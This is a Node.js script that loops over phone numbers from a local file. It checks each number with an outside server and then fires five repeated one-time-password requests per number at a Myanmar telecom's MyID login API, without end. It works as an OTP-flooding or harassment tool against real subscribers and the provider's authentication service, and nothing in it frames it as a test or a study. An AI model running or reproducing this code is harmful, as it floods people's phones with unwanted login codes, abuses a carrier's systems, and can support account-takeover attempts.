const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");

const config = {
  baseUrl: "https://ironcoder.site/ironmyid",
  otpUrl: "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp",
  loopDelay: 5000, // Delay (ms) before restarting the loop
  phoneDelay: 500, // Delay (ms) between phone numbers
};

async function loadPhones() {
  try {
    const phones = JSON.parse(fs.readFileSync("./phones.json", "utf-8"));
    if (!Array.isArray(phones) || phones.length === 0) {
      console.warn("⚠️ phones.json is empty or not an array. Waiting before retry...");
      return null;
    }
    console.log(`📋 Loaded ${phones.length} phone numbers from phones.json`);
    return phones;
  } catch (e) {
    console.error("❌ Failed to read or parse phones.json:", e.message);
    return null;
  }
}

async function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function postForm(phone) {
  const form = new FormData();
  form.append("phone", phone);

  try {
    const res = await axios.post(`https://iron-coder.site/ironmyid/online_users.php`, form, {
      headers: form.getHeaders(),
    });

    if (res.data.success) {
      console.log(`📨 Form posted & success for: ${phone}`);
      await sendOtp(phone);
    } else {
      console.log(`⛔ Form posted but no success for: ${phone}`);
    }
  } catch (e) {
    console.error(`❌ Error posting ${phone}:`, e.message);
  }
}

async function sendOtp(phone) {
  for (let i = 0; i < 5; i++) {
    try {
      const url = `${config.otpUrl}?phoneNumber=${phone}`;
      const res = await axios.get(url);
      if (res.status === 200) {
        console.log(`✅ (${i + 1}/5) OTP sent to ${phone}`);
      } else {
        console.log(`⚠️ (${i + 1}/5) Failed for ${phone}: Status ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ (${i + 1}/5) OTP error for ${phone}: ${e.message}`);
    }
    await delay(1000); // Delay between OTP attempts
  }
}

async function backgroundRequests() {
  try {
    await axios.head(`${config.baseUrl}/version.php`);
    console.log("✅ version.php reachable");
  } catch (e) {
    console.log("❌ version.php unreachable:", e.message);
  }

  try {
    await axios.head(`${config.baseUrl}/myads.php`);
    console.log("✅ myads.php reachable");
  } catch (e) {
    console.log("❌ myads.php unreachable:", e.message);
  }
}

async function mainLoop() {
  while (true) {
    const phones = await loadPhones();
    if (!phones) {
      console.log(`⏳ Waiting ${config.loopDelay}ms before checking phones.json again...`);
      await delay(config.loopDelay);
      continue;
    }

    console.log(`🚀 Starting new loop with ${phones.length} phone numbers at ${new Date().toLocaleString()}`);
    for (const phone of phones) {
      await postForm(phone);
      await delay(config.phoneDelay); // Delay between phone numbers
    }
    await backgroundRequests();
    console.log(`🔁 Finished processing all phones. Restarting loop after ${config.loopDelay}ms...\n`);
    await delay(config.loopDelay);
  }
}

process.on("SIGINT", () => {
  console.log("🛑 Shutting down...");
  process.exit(0);
});

mainLoop();
